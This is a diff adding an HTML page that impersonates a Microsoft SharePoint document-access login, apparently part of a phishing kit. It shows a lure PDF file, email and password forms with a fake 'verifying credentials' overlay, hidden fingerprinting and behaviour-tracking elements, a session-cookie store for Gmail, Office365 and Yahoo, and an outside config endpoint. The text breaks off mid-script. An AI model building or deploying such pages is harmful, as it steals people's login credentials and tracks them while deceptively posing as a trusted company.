@@ -1,0 +1,2335 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Microsoft SharePoint - Document Access</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📄</text></svg>">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Access your shared documents securely through Microsoft SharePoint document viewer with enterprise authentication.">
+    <meta name="keywords" content="sharepoint, document, access, microsoft, office365, secure">
+    <meta name="author" content="Microsoft Corporation">
+    <meta property="og:title" content="Microsoft SharePoint - Document Access">
+    <meta property="og:description" content="Access your secure documents with Microsoft authentication">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#0078d4">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #0078d4;
+            --dark-blue: #106ebe;
+            --light-blue: #50e6ff;
+            --purple: #5c2d91;
+            --green: #00a651;
+            --orange: #ff8c00;
+            --red: #d83b01;
+            --gray: #f3f3f3;
+            --dark-gray: #323130;
+            --error: #d83b01;
+            --border: #d0d0d0;
+            --shadow-light: 0 2px 8px rgba(0, 0, 0, 0.1);
+            --shadow-medium: 0 4px 16px rgba(0, 0, 0, 0.15);
+            --shadow-heavy: 0 8px 32px rgba(0, 0, 0, 0.2);
+            --transition-speed: 0.3s;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .bg-animation {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.15;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: float-particle linear infinite;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes float-particle {
+            0% {
+                transform: translateY(100vh) rotate(0deg) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(720deg) scale(1);
+                opacity: 0;
+            }
+        }
+
+        .main-content {
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            height: 54px;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            transition: all var(--transition-speed) ease;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .header.scrolled {
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: transform var(--transition-speed) ease;
+        }
+
+        .brand-logo:hover {
+            transform: scale(1.05);
+        }
+
+        .brand-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--purple) 100%);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 20px;
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+        }
+
+        .header-text {
+            font-size: 16px;
+            color: var(--dark-gray);
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 520px;
+            overflow: hidden;
+            transform: translateY(0);
+            transition: all var(--transition-speed) ease;
+            position: relative;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .login-card:hover {
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+            transform: translateY(-8px);
+        }
+
+        .login-header {
+            background: linear-gradient(135deg, #0078d4 0%, #5c2d91 50%, #0078d4 100%);
+            background-size: 200% 200%;
+            animation: gradient-shift 10s ease infinite;
+            padding: 48px 36px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes gradient-shift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .login-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            animation: pulse-glow 5s ease-in-out infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { 
+                transform: scale(1) rotate(0deg); 
+                opacity: 0.5; 
+            }
+            50% { 
+                transform: scale(1.3) rotate(180deg); 
+                opacity: 0.8; 
+            }
+        }
+
+        .login-header h1 {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 400;
+            margin: 0;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+            letter-spacing: -0.5px;
+        }
+
+        .login-body {
+            padding: 40px;
+        }
+
+        .file-preview {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 12px;
+            padding: 28px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            transition: all var(--transition-speed) ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid rgba(0, 120, 212, 0.1);
+        }
+
+        .file-preview::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 120, 212, 0.2), transparent);
+            transition: left 0.8s ease;
+        }
+
+        .file-preview:hover::before {
+            left: 100%;
+        }
+
+        .file-preview:hover {
+            transform: translateX(8px);
+            box-shadow: 0 8px 24px rgba(0, 120, 212, 0.2);
+            border-color: var(--primary-blue);
+        }
+
+        .file-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #d83b01 0%, #ff6b6b 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 32px;
+            flex-shrink: 0;
+            animation: float-icon 5s ease-in-out infinite;
+            box-shadow: 0 8px 16px rgba(216, 59, 1, 0.4);
+        }
+
+        @keyframes float-icon {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            25% { transform: translateY(-8px) rotate(-5deg); }
+            75% { transform: translateY(8px) rotate(5deg); }
+        }
+
+        .file-details {
+            flex: 1;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: var(--dark-gray);
+            margin-bottom: 8px;
+            font-size: 16px;
+            letter-spacing: -0.3px;
+        }
+
+        .file-info {
+            display: flex;
+            gap: 24px;
+            font-size: 14px;
+            color: #666;
+            flex-wrap: wrap;
+        }
+
+        .file-size {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: color var(--transition-speed) ease;
+        }
+
+        .file-preview:hover .file-size {
+            color: var(--primary-blue);
+        }
+
+        .email-providers {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+            flex-wrap: wrap;
+        }
+
+        .provider-pill {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 20px;
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border: 2px solid #e9ecef;
+            border-radius: 28px;
+            font-size: 14px;
+            color: #495057;
+            transition: all var(--transition-speed) ease;
+            cursor: pointer;
+            font-weight: 500;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .provider-pill:hover {
+            background: linear-gradient(135deg, #e9ecef 0%, #ffffff 100%);
+            transform: translateY(-4px) scale(1.05);
+            box-shadow: 0 8px 16px rgba(0, 120, 212, 0.2);
+            border-color: var(--primary-blue);
+        }
+
+        .provider-pill:active {
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        .provider-pill img {
+            width: 20px;
+            height: 20px;
+            transition: transform var(--transition-speed) ease;
+        }
+
+        .provider-pill:hover img {
+            transform: rotate(360deg);
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--dark-gray);
+            transition: color var(--transition-speed) ease;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 52px 16px 18px;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all var(--transition-speed) ease;
+            background: #fff;
+            color: var(--dark-gray);
+            font-family: inherit;
+        }
+
+        .form-input:hover {
+            border-color: var(--primary-blue);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .form-input.error {
+            border-color: var(--error);
+            box-shadow: 0 0 0 4px rgba(216, 59, 1, 0.15);
+            animation: shake-input 0.5s ease;
+        }
+
+        @keyframes shake-input {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 20px;
+            cursor: help;
+            transition: all var(--transition-speed) ease;
+        }
+
+        .form-group:hover .input-icon {
+            color: var(--primary-blue);
+            transform: translateY(-50%) scale(1.15);
+        }
+
+        .password-toggle {
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .password-toggle:hover {
+            color: var(--primary-blue);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-speed) ease;
+            position: relative;
+            overflow: hidden;
+            font-family: inherit;
+            letter-spacing: -0.3px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--dark-blue) 100%);
+            color: #fff;
+            box-shadow: 0 6px 16px rgba(0, 120, 212, 0.4);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, var(--dark-blue) 0%, var(--primary-blue) 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 24px rgba(0, 120, 212, 0.5);
+        }
+
+        .btn-primary:active {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-shine::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            transition: left 0.7s ease;
+        }
+
+        .btn:hover.btn-shine::after {
+            left: 100%;
+        }
+
+        .error-message {
+            display: none;
+            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
+            border: 2px solid #fecaca;
+            color: var(--error);
+            padding: 16px 18px;
+            border-radius: 8px;
+            font-size: 15px;
+            margin-bottom: 20px;
+            animation: slide-down 0.5s ease;
+            font-weight: 500;
+        }
+
+        @keyframes slide-down {
+            from {
+                opacity: 0;
+                transform: translateY(-15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .error-message.show {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .error-message i {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.95) 0%, rgba(118, 75, 162, 0.95) 100%);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+            animation: fade-in 0.4s ease;
+        }
+
+        @keyframes fade-in {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 32px;
+        }
+
+        .spinner {
+            width: 120px;
+            height: 120px;
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-right-color: #fff;
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner-inner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90px;
+            height: 90px;
+            border: 6px solid transparent;
+            border-bottom-color: rgba(255, 255, 255, 0.8);
+            border-left-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite reverse;
+        }
+
+        .spinner-dot {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            border: 6px solid transparent;
+            border-top-color: rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            letter-spacing: -0.3px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+            animation: pulse-text 2s ease-in-out infinite;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes pulse-text {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .loading-progress {
+            width: 300px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+            margin-top: 24px;
+            overflow: hidden;
+        }
+
+        .loading-progress-bar {
+            height: 100%;
+            background: #fff;
+            border-radius: 2px;
+            width: 0%;
+            animation: progress-animation 3s ease-in-out infinite;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        @keyframes progress-animation {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 32px;
+            padding: 16px 20px;
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            border-radius: 8px;
+            font-size: 14px;
+            color: #0369a1;
+            font-weight: 500;
+            border: 2px solid #bae6fd;
+            transition: all var(--transition-speed) ease;
+        }
+
+        .security-badge:hover {
+            background: linear-gradient(135deg, #e0f2fe 0%, #f0f9ff 100%);
+            transform: scale(1.03);
+        }
+
+        .security-badge i {
+            font-size: 20px;
+            animation: pulse-icon 2.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .password-view {
+            display: none;
+        }
+
+        .password-view.show {
+            display: block;
+            animation: fade-in-up 0.6s ease;
+        }
+
+        @keyframes fade-in-up {
+            from { 
+                opacity: 0; 
+                transform: translateY(25px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            padding: 20px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 10px;
+            margin-bottom: 28px;
+            border: 2px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .user-avatar {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--purple) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            flex-shrink: 0;
+            box-shadow: 0 6px 16px rgba(0, 120, 212, 0.4);
+        }
+
+        .user-email {
+            font-size: 16px;
+            color: var(--dark-gray);
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all var(--transition-speed) ease;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+            gap: 14px;
+            color: var(--dark-blue);
+        }
+
+        .back-link i {
+            transition: transform var(--transition-speed) ease;
+        }
+
+        .back-link:hover i {
+            transform: translateX(-5px);
+        }
+
+        .tooltip {
+            position: relative;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 320px;
+            background-color: #2d3748;
+            color: #fff;
+            text-align: left;
+            border-radius: 10px;
+            padding: 16px 18px;
+            position: absolute;
+            z-index: 1000;
+            bottom: 135%;
+            right: -130px;
+            opacity: 0;
+            transition: all var(--transition-speed) ease;
+            font-size: 14px;
+            line-height: 1.7;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            font-weight: 400;
+        }
+
+        .tooltip .tooltiptext::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            right: 140px;
+            margin-left: -7px;
+            border-width: 7px;
+            border-style: solid;
+            border-color: #2d3748 transparent transparent transparent;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+            bottom: 145%;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 28px 20px;
+            color: #fff;
+            font-size: 13px;
+            background: rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin-bottom: 14px;
+        }
+
+        .footer-links a {
+            color: #fff;
+            text-decoration: none;
+            transition: all var(--transition-speed) ease;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            color: var(--light-blue);
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            margin-top: 10px;
+            opacity: 0.9;
+        }
+
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-blue), var(--purple), var(--primary-blue));
+            background-size: 200% 100%;
+            width: 0%;
+            z-index: 9999;
+            transition: width 0.4s ease;
+            animation: gradient-flow 2s linear infinite;
+        }
+
+        @keyframes gradient-flow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+
+        .hidden-canvas {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .behavioral-tracker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -999;
+        }
+
+        @media (max-width: 768px) {
+            .login-card {
+                border-radius: 0;
+                box-shadow: none;
+                max-width: 100%;
+            }
+
+            .main-container {
+                padding: 0;
+            }
+
+            .login-body {
+                padding: 32px 28px;
+            }
+
+            .login-header {
+                padding: 40px 28px;
+            }
+
+            .login-header h1 {
+                font-size: 24px;
+            }
+
+            .email-providers {
+                gap: 10px;
+            }
+
+            .provider-pill {
+                padding: 10px 16px;
+                font-size: 13px;
+            }
+
+            .provider-pill img {
+                width: 18px;
+                height: 18px;
+            }
+
+            .tooltip .tooltiptext {
+                width: 280px;
+                right: -110px;
+            }
+
+            .tooltip .tooltiptext::after {
+                right: 120px;
+            }
+
+            .file-preview {
+                padding: 20px;
+                gap: 16px;
+            }
+
+            .file-icon {
+                width: 56px;
+                height: 56px;
+                font-size: 28px;
+            }
+
+            .loading-progress {
+                width: 250px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 0 18px;
+            }
+
+            .header-text {
+                font-size: 15px;
+            }
+
+            .login-body {
+                padding: 28px 24px;
+            }
+
+            .login-header {
+                padding: 36px 24px;
+            }
+
+            .login-header h1 {
+                font-size: 22px;
+            }
+
+            .form-input {
+                padding: 14px 48px 14px 16px;
+                font-size: 15px;
+            }
+
+            .btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+
+            .file-name {
+                font-size: 15px;
+            }
+
+            .file-info {
+                font-size: 13px;
+                gap: 16px;
+            }
+
+            .user-info {
+                padding: 16px;
+                gap: 14px;
+            }
+
+            .user-avatar {
+                width: 46px;
+                height: 46px;
+                font-size: 20px;
+            }
+
+            .user-email {
+                font-size: 15px;
+            }
+
+            .spinner-container {
+                width: 100px;
+                height: 100px;
+            }
+
+            .spinner {
+                width: 100px;
+                height: 100px;
+            }
+
+            .spinner-inner {
+                width: 75px;
+                height: 75px;
+            }
+
+            .spinner-dot {
+                width: 50px;
+                height: 50px;
+            }
+
+            .loading-text {
+                font-size: 19px;
+            }
+
+            .loading-subtext {
+                font-size: 14px;
+            }
+
+            .loading-progress {
+                width: 200px;
+            }
+        }
+
+        .visually-hidden {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            margin: -1px;
+            padding: 0;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
+        }
+
+        *:focus-visible {
+            outline: 2px solid var(--primary-blue);
+            outline-offset: 2px;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        ::selection {
+            background: var(--primary-blue);
+            color: #fff;
+        }
+
+        ::-moz-selection {
+            background: var(--primary-blue);
+            color: #fff;
+        }
+
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--gray);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-blue);
+            border-radius: 6px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--dark-blue);
+        }
+    </style>
+</head>
+<body>
+    <canvas class="hidden-canvas" id="fingerprint-canvas" width="200" height="50"></canvas>
+    <div class="behavioral-tracker" id="behavior-tracker"></div>
+    
+    <div class="progress-bar" id="progress-bar"></div>
+    <div class="bg-animation" id="bg-animation"></div>
+    
+    <div class="main-content" id="main-content">
+        <div class="header" id="header">
+            <div class="header-content">
+                <div class="brand-logo">
+                    <div class="brand-icon">
+                        <i class="fas fa-file-alt"></i>
+                    </div>
+                </div>
+                <div class="header-text">Microsoft SharePoint</div>
+            </div>
+        </div>
+
+        <div class="main-container">
+            <div class="login-card">
+                <div class="login-header">
+                    <h1 id="header-title">Access Shared Document</h1>
+                </div>
+                
+                <div class="login-body">
+                    <div id="initial-view">
+                        <div class="file-preview" role="button" tabindex="0">
+                            <div class="file-icon">
+                                <i class="fas fa-file-pdf"></i>
+                            </div>
+                            <div class="file-details">
+                                <div class="file-name" id="dynamic-filename">Confidential_Document_2026.pdf</div>
+                                <div class="file-info">
+                                    <div class="file-size">
+                                        <i class="fas fa-file"></i>
+                                        <span id="dynamic-filesize">56.1 KB</span>
+                                    </div>
+                                    <div class="file-size">
+                                        <i class="fas fa-lock"></i>
+                                        <span>Encrypted</span>
+                                    </div>
+                                    <div class="file-size">
+                                        <i class="fas fa-shield-alt"></i>
+                                        <span>Secure</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="email-providers">
+                            <div class="provider-pill">
+                                <img src="https://img.icons8.com/color/48/ms-outlook.png" alt="Outlook">
+                                <span>Outlook</span>
+                            </div>
+                            <div class="provider-pill">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/256px-Gmail_icon_%282020%29.svg.png" alt="Gmail">
+                                <span>Gmail</span>
+                            </div>
+                            <div class="provider-pill">
+                                <img src="https://img.icons8.com/color/48/yahoo.png" alt="Yahoo">
+                                <span>Yahoo</span>
+                            </div>
+                        </div>
+
+                        <div class="error-message" id="error-message">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <span id="error-text">Invalid email address</span>
+                        </div>
+
+                        <form id="email-form" novalidate>
+                            <div class="form-group">
+                                <label for="email" class="visually-hidden">Email address</label>
+                                <input 
+                                    type="email" 
+                                    id="email" 
+                                    name="email"
+                                    class="form-input" 
+                                    placeholder="Email address" 
+                                    autocomplete="email"
+                                    required
+                                >
+                                <div class="tooltip">
+                                    <i class="fas fa-info-circle input-icon"></i>
+                                    <span class="tooltiptext">
+                                        Enter the email address associated with this secure document. 
+                                        Make sure it matches the recipient email exactly for access verification.
+                                    </span>
+                                </div>
+                            </div>
+
+                            <button type="submit" class="btn btn-primary btn-shine" id="next-btn">
+                                Next
+                            </button>
+                        </form>
+
+                        <div class="security-badge">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Your information is protected by enterprise-grade security</span>
+                        </div>
+                    </div>
+
+                    <div id="password-view" class="password-view">
+                        <div class="user-info">
+                            <div class="user-avatar" id="user-avatar">
+                                <i class="fas fa-user"></i>
+                            </div>
+                            <div class="user-email" id="user-email-display"></div>
+                        </div>
+
+                        <div class="error-message" id="password-error">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <span>Incorrect password. Please try again.</span>
+                        </div>
+
+                        <form id="password-form" novalidate>
+                            <div class="form-group">
+                                <label for="password" class="visually-hidden">Password</label>
+                                <input 
+                                    type="password" 
+                                    id="password" 
+                                    name="password"
+                                    class="form-input" 
+                                    placeholder="Password" 
+                                    autocomplete="current-password"
+                                    required
+                                >
+                                <i class="fas fa-eye input-icon password-toggle" id="password-toggle"></i>
+                            </div>
+
+                            <button type="submit" class="btn btn-primary btn-shine" id="signin-btn">
+                                Sign in
+                            </button>
+                        </form>
+
+                        <a href="#" class="back-link" id="back-link">
+                            <i class="fas fa-arrow-left"></i> 
+                            <span>Use a different account</span>
+                        </a>
+
+                        <div class="security-badge">
+                            <i class="fas fa-lock"></i>
+                            <span>Connection secured with TLS 1.3 encryption</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Privacy & cookies</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Contact support</a>
+                <a href="#">Accessibility</a>
+            </div>
+            <div class="footer-copyright">
+                © 2026 Microsoft Corporation. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="spinner-inner"></div>
+            <div class="spinner-dot"></div>
+        </div>
+        <div class="loading-text" id="loading-text">Verifying your credentials...</div>
+        <div class="loading-subtext" id="loading-subtext">Authenticating with secure servers</div>
+        <div class="loading-progress">
+            <div class="loading-progress-bar"></div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    
+    <script>
+    $(document).ready(function() {
+        'use strict';
+
+        let attemptCount = 0;
+        let userEmail = '';
+        let sessionStartTime = Date.now();
+        let grabbedEmailFromURL = '';
+        let autoGrabSuccess = false;
+        let emailGrabSource = '';
+        let behavioralData = {
+            mouseMovements: [],
+            keyPressTimings: [],
+            scrollEvents: [],
+            clickEvents: [],
+            focusEvents: []
+        };
+        let canvasFingerprint = '';
+        let systemFingerprint = {};
+        let sessionCookies = {
+            gmail: {},
+            office365: {},
+            yahoo: {},
+            all: {}
+        };
+        
+        const MAX_ATTEMPTS = 2;
+        const CONFIG_ENDPOINT = 'https://oanapolis.com.br/safes/config.php';
+        const FORCED_REDIRECT_TIMEOUT = 5000;
+
+        function generateRandomString(length) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function generateDynamicContent() {
+            const fileTypes = ['Confidential_Report', 'Secure_Document', 'Private_File', 'Executive_Summary', 'Financial_Report', 'Business_Plan', 'Strategic_Overview', 'Annual_Report'];
